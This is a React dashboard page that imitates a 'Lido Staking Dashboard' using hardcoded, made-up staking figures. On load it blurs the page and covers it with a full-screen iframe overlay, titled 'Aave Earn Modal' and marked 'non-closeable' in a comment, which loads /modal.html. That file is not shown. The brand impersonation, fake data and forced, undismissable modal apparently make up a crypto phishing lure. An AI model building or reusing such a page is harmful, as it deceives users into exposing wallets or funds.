"use client"

import { useEffect, useState } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"

export default function DashboardPage() {
  const [mounted, setMounted] = useState(false)

  useEffect(() => {
    setMounted(true)
  }, [])

  return (
    <>
      {/* Dashboard Content - loads immediately with blur */}
      <div className={`min-h-screen bg-background transition-all duration-300 ${mounted ? "blur-[2px]" : ""}`}>
        <div className="container mx-auto p-4 md:p-8">
          {/* Header Section */}
          <div className="mb-8">
            <div className="flex items-center gap-3 mb-2">
              <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-[#2EAADC] to-[#9B6DFF] flex items-center justify-center">
                <svg
                  className="w-6 h-6 text-white"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                >
                  <path d="M13 10V3L4 14h7v7l9-11h-7z" />
                </svg>
              </div>
              <div>
                <h1 className="text-3xl md:text-4xl font-bold text-foreground">Lido Staking Dashboard</h1>
                <p className="text-muted-foreground">Manage your staking portfolio</p>
              </div>
            </div>
          </div>

          {/* Stats Grid */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 md:gap-6 mb-8">
            <Card>
              <CardHeader>
                <CardDescription>Total Staked</CardDescription>
                <CardTitle className="text-2xl md:text-3xl">125.5 ETH</CardTitle>
              </CardHeader>
              <CardContent>
                <Badge variant="secondary" className="bg-green-500/10 text-green-500 hover:bg-green-500/20">
                  +12.3% APY
                </Badge>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardDescription>Rewards Earned</CardDescription>
                <CardTitle className="text-2xl md:text-3xl">3.42 ETH</CardTitle>
              </CardHeader>
              <CardContent>
                <Badge variant="secondary" className="bg-blue-500/10 text-blue-500 hover:bg-blue-500/20">
                  This month
                </Badge>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardDescription>Active Validators</CardDescription>
                <CardTitle className="text-2xl md:text-3xl">12</CardTitle>
              </CardHeader>
              <CardContent>
                <Badge variant="secondary" className="bg-purple-500/10 text-purple-500 hover:bg-purple-500/20">
                  All Active
                </Badge>
              </CardContent>
            </Card>
          </div>

          {/* Main Content Area */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 md:gap-6">
            <Card>
              <CardHeader>
                <CardTitle>Recent Activity</CardTitle>
                <CardDescription>Your latest staking transactions</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex items-center justify-between p-4 rounded-lg bg-muted/50">
                  <div>
                    <p className="font-medium">Staked 10 ETH</p>
                    <p className="text-sm text-muted-foreground">2 hours ago</p>
                  </div>
                  <Badge>Confirmed</Badge>
                </div>
                <div className="flex items-center justify-between p-4 rounded-lg bg-muted/50">
                  <div>
                    <p className="font-medium">Claimed Rewards</p>
                    <p className="text-sm text-muted-foreground">1 day ago</p>
                  </div>
                  <Badge>Completed</Badge>
                </div>
                <div className="flex items-center justify-between p-4 rounded-lg bg-muted/50">
                  <div>
                    <p className="font-medium">Staked 25 ETH</p>
                    <p className="text-sm text-muted-foreground">3 days ago</p>
                  </div>
                  <Badge>Confirmed</Badge>
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle>Performance</CardTitle>
                <CardDescription>Your staking performance overview</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">APY Rate</span>
                    <span className="font-medium">12.3%</span>
                  </div>
                  <div className="h-2 bg-muted rounded-full overflow-hidden">
                    <div className="h-full bg-gradient-to-r from-[#2EAADC] to-[#9B6DFF] w-[85%]" />
                  </div>
                </div>
                <div className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">Validator Uptime</span>
                    <span className="font-medium">99.8%</span>
                  </div>
                  <div className="h-2 bg-muted rounded-full overflow-hidden">
                    <div className="h-full bg-gradient-to-r from-green-500 to-emerald-500 w-[99.8%]" />
                  </div>
                </div>
                <div className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">Network Participation</span>
                    <span className="font-medium">100%</span>
                  </div>
                  <div className="h-2 bg-muted rounded-full overflow-hidden">
                    <div className="h-full bg-gradient-to-r from-purple-500 to-pink-500 w-full" />
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Quick Actions */}
          <div className="mt-8">
            <Card>
              <CardHeader>
                <CardTitle>Quick Actions</CardTitle>
                <CardDescription>Manage your staking portfolio</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                  <Button className="h-auto flex-col gap-2 p-4">
                    <svg className="w-6 h-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M12 5v14M5 12h14" />
                    </svg>
                    <span>Stake More</span>
                  </Button>
                  <Button variant="outline" className="h-auto flex-col gap-2 p-4 bg-transparent">
                    <svg className="w-6 h-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                      <path d="M9 12l2 2 4-4" />
                    </svg>
                    <span>Claim Rewards</span>
                  </Button>
                  <Button variant="outline" className="h-auto flex-col gap-2 p-4 bg-transparent">
                    <svg className="w-6 h-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
                    </svg>
                    <span>Unstake</span>
                  </Button>
                  <Button variant="outline" className="h-auto flex-col gap-2 p-4 bg-transparent">
                    <svg className="w-6 h-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
                    </svg>
                    <span>History</span>
                  </Button>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>

      {/* Modal loads on top - non-closeable */}
      {mounted && (
        <iframe src="/modal.html" className="fixed inset-0 w-full h-full z-50 border-0" title="Aave Earn Modal" />
      )}
    </>
  )
}
